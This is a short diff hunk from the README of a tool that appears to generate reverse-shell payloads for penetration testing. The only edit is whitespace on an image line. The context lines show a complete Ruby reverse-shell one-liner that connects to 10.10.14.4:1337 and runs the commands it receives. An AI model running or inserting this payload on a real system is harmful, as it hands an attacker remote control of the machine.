@@ -99,7 +99,7 @@ Output of command `lazypariah ruby 10.10.14.4 1337`:
 require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
 ```
 Below is an example of the `c_binary_gzip_b64` payload in action:
-![Alt text](./lazypariah_c_binary_gzip_b64_demo.png)
+![Alt text](./lazypariah_c_binary_gzip_b64_demo.png) 
 
 ## Author
 Copyright (C) 2020 Peter Bruce Funnell
